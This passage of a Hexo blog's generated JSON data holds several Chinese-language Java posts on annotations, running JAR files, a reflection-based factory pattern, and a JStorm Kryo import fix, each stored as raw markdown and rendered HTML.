放在方法前，如果你这个方法并不是覆盖了超类方法，则编译时就能检查出。</li>\n<li>标记业务类，执行业务方法</li>\n<li></li>\n</ul>\n<p><a href=\"http://docs.oracle.com/javase/7/docs/api/\" target=\"_blank\" rel=\"noopener\">javaAPI</a></p>\n<p><a href=\"http://www.importnew.com/10294.html\" target=\"_blank\" rel=\"noopener\">理解</a></p>\n<p><a href=\"http://blog.csdn.net/beyond0851/article/details/8520993\" target=\"_blank\" rel=\"noopener\">使用场景1</a></p>\n<p><a href=\"http://www.cnblogs.com/yanbincn/archive/2012/06/19/2554318.html\" target=\"_blank\" rel=\"noopener\">使用场景2</a></p>\n<p><a href=\"http://www.importnew.com/23816.html\" target=\"_blank\" rel=\"noopener\">java中注解获取</a></p>\n<p><a href=\"http://fanyc.iteye.com/blog/2224809\" target=\"_blank\" rel=\"noopener\">Spring获取注解</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-spring-iocannt/\" target=\"_blank\" rel=\"noopener\">Spring注解大全</a></p>\n<p><a href=\"http://snv.iteye.com/blog/2277054\" target=\"_blank\" rel=\"noopener\">获取自定义注解</a></p>\n<p><a href=\"http://www.itwendao.com/article/detail/315485.html\" target=\"_blank\" rel=\"noopener\">Spring注解获取</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"注解是什么\"><a href=\"#注解是什么\" class=\"headerlink\" title=\"注解是什么\"></a>注解是什么</h3><p>注解是描述Java代码的代码，它能够被编译器解析，注解处理工具在运行时也能够解析注解。用来标识代码，提供额外的信息做特殊处理。<br>比如：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Override</span><br><span class=\"line\">public String toString()&#123;</span><br><span class=\"line\">    return &quot;&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>@Override 是一个常用的注解，它标识我们重写了某个方法。</p>\n<h3 id=\"注解的作用\"><a href=\"#注解的作用\" class=\"headerlink\" title=\"注解的作用\"></a>注解的作用</h3><p>还是@Override注解，Ctrl+左键点击，查看源代码。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package java.lang;</span><br><span class=\"line\">import java.lang.annotation.*;</span><br><span class=\"line\"></span><br><span class=\"line\">/**</span><br><span class=\"line\"> * Indicates that a method declaration is intended to override a</span><br><span class=\"line\"> * method declaration in a supertype. If a method is annotated with</span><br><span class=\"line\"> * this annotation type compilers are required to generate an error</span><br><span class=\"line\"> * message unless at least one of the following conditions hold:</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * &lt;ul&gt;&lt;li&gt;</span><br><span class=\"line\"> * The method does override or implement a method declared in a</span><br><span class=\"line\"> * supertype.</span><br><span class=\"line\"> * &lt;/li&gt;&lt;li&gt;</span><br><span class=\"line\"> * The method has a signature that is override-equivalent to that of</span><br><span class=\"line\"> * any public method declared in &#123;@linkplain Object&#125;.</span><br><span class=\"line\"> * &lt;/li&gt;&lt;/ul&gt;</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * @author  Peter von der Ah&amp;eacute;</span><br><span class=\"line\"> * @author  Joshua Bloch</span><br><span class=\"line\"> * @jls 9.6.1.4 @Override</span><br><span class=\"line\"> * @since 1.5</span><br><span class=\"line\"> */</span><br><span class=\"line\">@Target(ElementType.METHOD)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface Override &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注释的大致意思是当一个方法被这个注解标记的时候要满足：</p>\n<p><em>实现了或者重写了父类的方法</em></p>\n<p><em>实现或者重写了Object类的方法</em></p>\n<h3 id=\"Java提供的注解\"><a href=\"#Java提供的注解\" class=\"headerlink\" title=\"Java提供的注解\"></a>Java提供的注解</h3><blockquote>\n<p> @SuppressWarnings()</p>\n<p>  @Property</p>\n<p>   @Ignore</p>\n<p>   @Deprecated</p>\n<p>…</p>\n</blockquote>\n<ul>\n<li><h5 id=\"元注解\"><a href=\"#元注解\" class=\"headerlink\" title=\"元注解\"></a>元注解</h5>在@override的源码中有<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(ElementType.METHOD)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface Override &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>@Target和@Retention是元注解。元注解即用来描述注解的注解，只能应用于对方法进行注解。</p>\n<h5 id=\"在JDK源码中注解包内容如图\"><a href=\"#在JDK源码中注解包内容如图\" class=\"headerlink\" title=\"在JDK源码中注解包内容如图\"></a>在JDK源码中注解包内容如图</h5><p><img src=\"C:\\Users\\Hanke_000\\Desktop\\1.jpg\" alt=\"image\"></p>\n<h5 id=\"类之间的关系如图\"><a href=\"#类之间的关系如图\" class=\"headerlink\" title=\"类之间的关系如图\"></a>类之间的关系如图</h5><p><img src=\"C:\\Users\\Hanke_000\\Desktop\\diagram.png\" alt=\"image\"><br>@Document、@Target、@Retention和@inherrited是元注解</p>\n<h5 id=\"元注解的作用\"><a href=\"#元注解的作用\" class=\"headerlink\" title=\"元注解的作用\"></a>元注解的作用</h5><ol>\n<li><p>Documented<br>当一个注解类型被@Documented元注解所描述时，那么无论在哪里使用这个注解，都会被Javadoc工具文档化</p>\n</li>\n<li><p>Inherited型是自动继承的。具体解释如下：若一个注解类型被Inherited元注解所修饰，则当用户在一个类声明中查询该注解类型时，若发现这个类声明中不包含这个注解类型，则会自动在这个类的父类中查询相应的注解类型，这个过程会被重复，直到该注解类型被找到或是查找完了Object类还未找到</p>\n</li>\n<li>Retention<br>我们在上面已经见到个这个元注解，它表示一个注解类型会被保留到什么时候</li>\n<li>Target<br>这个元注解说明了被修饰的注解的应用范围，也就是被修饰的注解可以用来注解哪些程序元素.</li>\n</ol>\n<h3 id=\"自定义注解\"><a href=\"#自定义注解\" class=\"headerlink\" title=\"自定义注解\"></a>自定义注解</h3><ol>\n<li>注解类型通过”@interface“关键字定义的</li>\n<li>在”注解体“中，所有的方法均没有方法体且只允许public和abstract这两种修饰符号（不加修饰符缺省为public），注解方法不允许有throws子句；</li>\n<li>注解方法的返回值只能为以下几种：原始数据类型）, String, Class, 枚举类型, 注解和它们的一维数组，可以为方法指定默认返回值。</li>\n</ol>\n<p>下面是一个自定义的注解<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Target(&#123;TYPE, FIELD, METHOD, PARAMETER, CONSTRUCTOR, LOCAL_VARIABLE&#125;)</span><br><span class=\"line\">@Retention(RetentionPolicy.SOURCE)</span><br><span class=\"line\">public @interface myAnnotation &#123;</span><br><span class=\"line\">    String[] value();</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"注解的应用\"><a href=\"#注解的应用\" class=\"headerlink\" title=\"注解的应用\"></a>注解的应用</h3><ul>\n<li>生成文档。这是最常见的，也是Java 最早提供的注解。常用的有@see @param @return 等</li>\n<li>跟踪代码依赖性，实现替代配置文件功能。比较常见的是spring 2.5 开始的基于注解配置。作用就是减少配置。现在的框架基本都使用了这种配置来减少配置文件的数量。以后java的程序开发，最多的也将实现注解配置，具有很大用处</li>\n<li>在编译时进行格式检查。如@override 放在方法前，如果你这个方法并不是覆盖了超类方法，则编译时就能检查出。</li>\n<li>标记业务类，执行业务方法</li>\n<li></li>\n</ul>\n<p><a href=\"http://docs.oracle.com/javase/7/docs/api/\" target=\"_blank\" rel=\"noopener\">javaAPI</a></p>\n<p><a href=\"http://www.importnew.com/10294.html\" target=\"_blank\" rel=\"noopener\">理解</a></p>\n<p><a href=\"http://blog.csdn.net/beyond0851/article/details/8520993\" target=\"_blank\" rel=\"noopener\">使用场景1</a></p>\n<p><a href=\"http://www.cnblogs.com/yanbincn/archive/2012/06/19/2554318.html\" target=\"_blank\" rel=\"noopener\">使用场景2</a></p>\n<p><a href=\"http://www.importnew.com/23816.html\" target=\"_blank\" rel=\"noopener\">java中注解获取</a></p>\n<p><a href=\"http://fanyc.iteye.com/blog/2224809\" target=\"_blank\" rel=\"noopener\">Spring获取注解</a></p>\n<p><a href=\"https://www.ibm.com/developerworks/cn/opensource/os-cn-spring-iocannt/\" target=\"_blank\" rel=\"noopener\">Spring注解大全</a></p>\n<p><a href=\"http://snv.iteye.com/blog/2277054\" target=\"_blank\" rel=\"noopener\">获取自定义注解</a></p>\n<p><a href=\"http://www.itwendao.com/article/detail/315485.html\" target=\"_blank\" rel=\"noopener\">Spring注解获取</a></p>\n"},{"title":"设计模式--责任链","date":"2018-07-10T13:09:19.000Z","_content":"[ssssssssssssssssssssssssss](http://www.cnblogs.com/java-my-life/archive/2012/05/28/2516865.html)","source":"_posts/Java/设计模式--责任链.md","raw":"---\ntitle: 设计模式--责任链\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n[ssssssssssssssssssssssssss](http://www.cnblogs.com/java-my-life/archive/2012/05/28/2516865.html)","slug":"Java/设计模式--责任链","published":1,"updated":"2018-07-10T13:10:09.904Z","_id":"cjjedmh9v003g0gtjkfl19s2s","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://www.cnblogs.com/java-my-life/archive/2012/05/28/2516865.html\" target=\"_blank\" rel=\"noopener\">ssssssssssssssssssssssssss</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.cnblogs.com/java-my-life/archive/2012/05/28/2516865.html\" target=\"_blank\" rel=\"noopener\">ssssssssssssssssssssssssss</a></p>\n"},{"title":"运行Jar文件","date":"2018-07-10T13:09:19.000Z","_content":"在pom文件中有主类属性\n\n    java -jar test.jar val1 val2\n\n没有设置主类\n\n    java -cp test.jar com.test.testJar param1 param2","source":"_posts/Java/运行Jar文件.md","raw":"---\ntitle: 运行Jar文件\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n在pom文件中有主类属性\n\n    java -jar test.jar val1 val2\n\n没有设置主类\n\n    java -cp test.jar com.test.testJar param1 param2","slug":"Java/运行Jar文件","published":1,"updated":"2018-07-10T13:10:09.905Z","_id":"cjjedmh9w003i0gtjhx9zenl0","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在pom文件中有主类属性</p>\n<pre><code>java -jar test.jar val1 val2\n</code></pre><p>没有设置主类</p>\n<pre><code>java -cp test.jar com.test.testJar param1 param2\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p>在pom文件中有主类属性</p>\n<pre><code>java -jar test.jar val1 val2\n</code></pre><p>没有设置主类</p>\n<pre><code>java -cp test.jar com.test.testJar param1 param2\n</code></pre>"},{"title":"通过反射优化工厂模式","date":"2018-07-10T13:09:19.000Z","_content":"### 1.工厂模式\n工厂模式是我们最常用的实例化对象模式了，是用工厂方法代替new操作的一种模式。著名的Jive论坛 ,就大量使用了工厂模式，工厂模式在Java程序系统可以说是随处可见。因为工厂模式就相当于创建实例对象的new，我们经常要根据类Class生成实例对象，如A a=newA() 工厂模式也是用来创建实例对象的，所以以后new时就要多个心眼，是否可以考虑使用工厂模式，虽然这样做，可能多做一些工作，但会给你系统带来更大的可扩展性和尽量少的修改量。\n\n[具体内容见另一篇博客](http://blog.csdn.net/boomhankers/article/details/50359666)\n### 2.不足\n当增加一个子类的时候需要修改工厂类，这样很麻烦\n### 3.利用反射改进\n###### 思路：工厂类通过反新的子类的路径，并使用getInstace()方法来获取一个类的实例。\n###### 实现\n```\npackage com.learn.controller;\n\npublic class Factory {\n    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException {\n            man m = reflectFactory.getInstance(\"com.learn.controller.Chinese\");\n            System.out.println(m.sayHello());\n    }\n}\n\ninterface man {\n    String sayHello();\n}\n\nclass Chinese implements man {\n\n    public String sayHello() {\n        return \"nihao\";\n    }\n}\n\nclass Waiguoren implements man {\n\n    public String sayHello() {\n        return \"hello\";\n    }\n}\nclass reflectFactory{\n    public static man getInstance(String mantype) throws ClassNotFoundException, IllegalAccessException, InstantiationException {\n        man man = null;\n        man = (man) Class.forName(mantype).newInstance();\n        return man;\n    }\n}\n\n```\n运行结构如下：\n> nihao\n### 4.结合属性文件优化\n###### 思路： 把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say()函数\n###### 实现：\n\n先假装读到了配置文件保存在了一个数组中，就是下面的==mans==数组\n\n```\npublic class Factory {\n    static String[] mans = new String[]{\n            \"com.learn.controller.Chinese\",\n            \"com.learn.controller.Waiguoren\"\n    };\n\n    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException {\n        man m = reflectFactory.getInstance(mans[0]);\n        System.out.println(m.sayHello());\n    }\n}\n```\n###### 运行结果：\n你猜【尴尬脸】\n### 5.结合注解优化\n*待更新*","source":"_posts/Java/通过反射优化工厂模式.md","raw":"---\ntitle: 通过反射优化工厂模式\ndate: 2018-07-10 21:09:19\ntags: Java\n---\n### 1.工厂模式\n工厂模式是我们最常用的实例化对象模式了，是用工厂方法代替new操作的一种模式。著名的Jive论坛 ,就大量使用了工厂模式，工厂模式在Java程序系统可以说是随处可见。因为工厂模式就相当于创建实例对象的new，我们经常要根据类Class生成实例对象，如A a=newA() 工厂模式也是用来创建实例对象的，所以以后new时就要多个心眼，是否可以考虑使用工厂模式，虽然这样做，可能多做一些工作，但会给你系统带来更大的可扩展性和尽量少的修改量。\n\n[具体内容见另一篇博客](http://blog.csdn.net/boomhankers/article/details/50359666)\n### 2.不足\n当增加一个子类的时候需要修改工厂类，这样很麻烦\n### 3.利用反射改进\n###### 思路：工厂类通过反新的子类的路径，并使用getInstace()方法来获取一个类的实例。\n###### 实现\n```\npackage com.learn.controller;\n\npublic class Factory {\n    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException {\n            man m = reflectFactory.getInstance(\"com.learn.controller.Chinese\");\n            System.out.println(m.sayHello());\n    }\n}\n\ninterface man {\n    String sayHello();\n}\n\nclass Chinese implements man {\n\n    public String sayHello() {\n        return \"nihao\";\n    }\n}\n\nclass Waiguoren implements man {\n\n    public String sayHello() {\n        return \"hello\";\n    }\n}\nclass reflectFactory{\n    public static man getInstance(String mantype) throws ClassNotFoundException, IllegalAccessException, InstantiationException {\n        man man = null;\n        man = (man) Class.forName(mantype).newInstance();\n        return man;\n    }\n}\n\n```\n运行结构如下：\n> nihao\n### 4.结合属性文件优化\n###### 思路： 把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say()函数\n###### 实现：\n\n先假装读到了配置文件保存在了一个数组中，就是下面的==mans==数组\n\n```\npublic class Factory {\n    static String[] mans = new String[]{\n            \"com.learn.controller.Chinese\",\n            \"com.learn.controller.Waiguoren\"\n    };\n\n    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException {\n        man m = reflectFactory.getInstance(mans[0]);\n        System.out.println(m.sayHello());\n    }\n}\n```\n###### 运行结果：\n你猜【尴尬脸】\n### 5.结合注解优化\n*待更新*","slug":"Java/通过反射优化工厂模式","published":1,"updated":"2018-07-10T13:10:09.906Z","_id":"cjjedmh9w003k0gtjnfiij3l3","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"1-工厂模式\"><a href=\"#1-工厂模式\" class=\"headerlink\" title=\"1.工厂模式\"></a>1.工厂模式</h3><p>工厂模式是我们最常用的实例化对象模式了，是用工厂方法代替new操作的一种模式。著名的Jive论坛 ,就大量使用了工厂模式，工厂模式在Java程序系统可以说是随处可见。因为工厂模式就相当于创建实例对象的new，我们经常要根据类Class生成实例对象，如A a=newA() 工厂模式也是用来创建实例对象的，所以以后new时就要多个心眼，是否可以考虑使用工厂模式，虽然这样做，可能多做一些工作，但会给你系统带来更大的可扩展性和尽量少的修改量。</p>\n<p><a href=\"http://blog.csdn.net/boomhankers/article/details/50359666\" target=\"_blank\" rel=\"noopener\">具体内容见另一篇博客</a></p>\n<h3 id=\"2-不足\"><a href=\"#2-不足\" class=\"headerlink\" title=\"2.不足\"></a>2.不足</h3><p>当增加一个子类的时候需要修改工厂类，这样很麻烦</p>\n<h3 id=\"3-利用反射改进\"><a href=\"#3-利用反射改进\" class=\"headerlink\" title=\"3.利用反射改进\"></a>3.利用反射改进</h3><h6 id=\"思路：工厂类通过反新的子类的路径，并使用getInstace-方法来获取一个类的实例。\"><a href=\"#思路：工厂类通过反新的子类的路径，并使用getInstace-方法来获取一个类的实例。\" class=\"headerlink\" title=\"思路：工厂类通过反新的子类的路径，并使用getInstace()方法来获取一个类的实例。\"></a>思路：工厂类通过反新的子类的路径，并使用getInstace()方法来获取一个类的实例。</h6><h6 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.learn.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Factory &#123;</span><br><span class=\"line\">    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException &#123;</span><br><span class=\"line\">            man m = reflectFactory.getInstance(&quot;com.learn.controller.Chinese&quot;);</span><br><span class=\"line\">            System.out.println(m.sayHello());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">interface man &#123;</span><br><span class=\"line\">    String sayHello();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Chinese implements man &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String sayHello() &#123;</span><br><span class=\"line\">        return &quot;nihao&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Waiguoren implements man &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String sayHello() &#123;</span><br><span class=\"line\">        return &quot;hello&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class reflectFactory&#123;</span><br><span class=\"line\">    public static man getInstance(String mantype) throws ClassNotFoundException, IllegalAccessException, InstantiationException &#123;</span><br><span class=\"line\">        man man = null;</span><br><span class=\"line\">        man = (man) Class.forName(mantype).newInstance();</span><br><span class=\"line\">        return man;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>运行结构如下：</p>\n<blockquote>\n<p>nihao</p>\n</blockquote>\n<h3 id=\"4-结合属性文件优化\"><a href=\"#4-结合属性文件优化\" class=\"headerlink\" title=\"4.结合属性文件优化\"></a>4.结合属性文件优化</h3><h6 id=\"思路：-把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say-函数\"><a href=\"#思路：-把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say-函数\" class=\"headerlink\" title=\"思路： 把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say()函数\"></a>思路： 把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say()函数</h6><h6 id=\"实现：\"><a href=\"#实现：\" class=\"headerlink\" title=\"实现：\"></a>实现：</h6><p>先假装读到了配置文件保存在了一个数组中，就是下面的==mans==数组</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Factory &#123;</span><br><span class=\"line\">    static String[] mans = new String[]&#123;</span><br><span class=\"line\">            &quot;com.learn.controller.Chinese&quot;,</span><br><span class=\"line\">            &quot;com.learn.controller.Waiguoren&quot;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException &#123;</span><br><span class=\"line\">        man m = reflectFactory.getInstance(mans[0]);</span><br><span class=\"line\">        System.out.println(m.sayHello());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"运行结果：\"><a href=\"#运行结果：\" class=\"headerlink\" title=\"运行结果：\"></a>运行结果：</h6><p>你猜【尴尬脸】</p>\n<h3 id=\"5-结合注解优化\"><a href=\"#5-结合注解优化\" class=\"headerlink\" title=\"5.结合注解优化\"></a>5.结合注解优化</h3><p><em>待更新</em></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-工厂模式\"><a href=\"#1-工厂模式\" class=\"headerlink\" title=\"1.工厂模式\"></a>1.工厂模式</h3><p>工厂模式是我们最常用的实例化对象模式了，是用工厂方法代替new操作的一种模式。著名的Jive论坛 ,就大量使用了工厂模式，工厂模式在Java程序系统可以说是随处可见。因为工厂模式就相当于创建实例对象的new，我们经常要根据类Class生成实例对象，如A a=newA() 工厂模式也是用来创建实例对象的，所以以后new时就要多个心眼，是否可以考虑使用工厂模式，虽然这样做，可能多做一些工作，但会给你系统带来更大的可扩展性和尽量少的修改量。</p>\n<p><a href=\"http://blog.csdn.net/boomhankers/article/details/50359666\" target=\"_blank\" rel=\"noopener\">具体内容见另一篇博客</a></p>\n<h3 id=\"2-不足\"><a href=\"#2-不足\" class=\"headerlink\" title=\"2.不足\"></a>2.不足</h3><p>当增加一个子类的时候需要修改工厂类，这样很麻烦</p>\n<h3 id=\"3-利用反射改进\"><a href=\"#3-利用反射改进\" class=\"headerlink\" title=\"3.利用反射改进\"></a>3.利用反射改进</h3><h6 id=\"思路：工厂类通过反新的子类的路径，并使用getInstace-方法来获取一个类的实例。\"><a href=\"#思路：工厂类通过反新的子类的路径，并使用getInstace-方法来获取一个类的实例。\" class=\"headerlink\" title=\"思路：工厂类通过反新的子类的路径，并使用getInstace()方法来获取一个类的实例。\"></a>思路：工厂类通过反新的子类的路径，并使用getInstace()方法来获取一个类的实例。</h6><h6 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package com.learn.controller;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Factory &#123;</span><br><span class=\"line\">    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException &#123;</span><br><span class=\"line\">            man m = reflectFactory.getInstance(&quot;com.learn.controller.Chinese&quot;);</span><br><span class=\"line\">            System.out.println(m.sayHello());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">interface man &#123;</span><br><span class=\"line\">    String sayHello();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Chinese implements man &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String sayHello() &#123;</span><br><span class=\"line\">        return &quot;nihao&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Waiguoren implements man &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public String sayHello() &#123;</span><br><span class=\"line\">        return &quot;hello&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class reflectFactory&#123;</span><br><span class=\"line\">    public static man getInstance(String mantype) throws ClassNotFoundException, IllegalAccessException, InstantiationException &#123;</span><br><span class=\"line\">        man man = null;</span><br><span class=\"line\">        man = (man) Class.forName(mantype).newInstance();</span><br><span class=\"line\">        return man;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>运行结构如下：</p>\n<blockquote>\n<p>nihao</p>\n</blockquote>\n<h3 id=\"4-结合属性文件优化\"><a href=\"#4-结合属性文件优化\" class=\"headerlink\" title=\"4.结合属性文件优化\"></a>4.结合属性文件优化</h3><h6 id=\"思路：-把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say-函数\"><a href=\"#思路：-把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say-函数\" class=\"headerlink\" title=\"思路： 把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say()函数\"></a>思路： 把所有类的完整路径都写到文件里然后读文件传入工厂类中去只想say()函数</h6><h6 id=\"实现：\"><a href=\"#实现：\" class=\"headerlink\" title=\"实现：\"></a>实现：</h6><p>先假装读到了配置文件保存在了一个数组中，就是下面的==mans==数组</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class Factory &#123;</span><br><span class=\"line\">    static String[] mans = new String[]&#123;</span><br><span class=\"line\">            &quot;com.learn.controller.Chinese&quot;,</span><br><span class=\"line\">            &quot;com.learn.controller.Waiguoren&quot;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] as) throws IllegalAccessException, InstantiationException, ClassNotFoundException &#123;</span><br><span class=\"line\">        man m = reflectFactory.getInstance(mans[0]);</span><br><span class=\"line\">        System.out.println(m.sayHello());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"运行结果：\"><a href=\"#运行结果：\" class=\"headerlink\" title=\"运行结果：\"></a>运行结果：</h6><p>你猜【尴尬脸】</p>\n<h3 id=\"5-结合注解优化\"><a href=\"#5-结合注解优化\" class=\"headerlink\" title=\"5.结合注解优化\"></a>5.结合注解优化</h3><p><em>待更新</em></p>\n"},{"title":"github  example报错","date":"2018-07-10T13:09:19.000Z","_content":"注释掉 ==com.esotericsoftware.kryo.Kryo== 然后重新导入新包\n```\nimport com.alibaba.jstorm.esotericsoftware.kryo.Kryo;\nimport com.alibaba.jstorm.esotericsoftware.kryo.Serializer;\nimport com.alibaba.jstorm.esotericsoftware.kryo.io.Input;\nimport com.alibaba.jstorm.esotericsoftware.kryo.io.Output;\nimport com.alipay.dw.jstorm.example.sequence.bean.Pair;\n\n//import com.esotericsoftware.kryo.Kryo;\n//import com.esotericsoftware.kryo.Serializer;\n//import com.esotericsoftware.kryo.io.Input;\n//import com.esotericsoftware.kryo.io.Output;\n\n```\n\n","source":"_posts/Jstrom/github  example报错.md","raw":"---\ntitle: github  example报错\ndate: 2018-07-10 21:09:19\ntags: Jstrom\n---\n注释掉 